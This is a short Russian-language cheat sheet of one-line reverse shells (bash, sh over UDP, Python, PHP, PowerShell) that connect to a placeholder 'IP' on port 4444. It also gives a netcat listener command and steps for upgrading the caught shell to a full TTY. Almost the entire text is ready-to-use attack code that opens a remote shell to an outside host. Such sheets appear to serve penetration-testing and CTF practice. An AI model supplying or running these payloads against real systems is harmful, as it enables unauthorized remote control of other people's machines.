# Reverse shells

Шеллы одной строкой. Куда слушать: `nc -lvnp 4444`.

## bash

```bash
bash -i >& /dev/tcp/IP/4444 0>&1
```

## sh

```sh
sh -i >& /dev/udp/IP/4444 0>&1
```

UDP-шелл кривой, ввод нормально не работает. Только если TCP режут совсем.

## python

```python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

## php

```php
php -r '$sock=fsockopen("IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

## powershell

```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

Длинно, зато работает на винде из коробки.

## Апгрейд до нормального tty

В своём терминале, когда шелл повис после Ctrl+Z:

```bash
stty raw -echo; fg
```

Уже в шелле:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

Без этого Ctrl+C рвёт шелл, а полудуплекс бесит по мелочи. Первое время постоянно забывал `fg` после Ctrl+Z — шелл «вис», хотя просто сворачивался в фон.
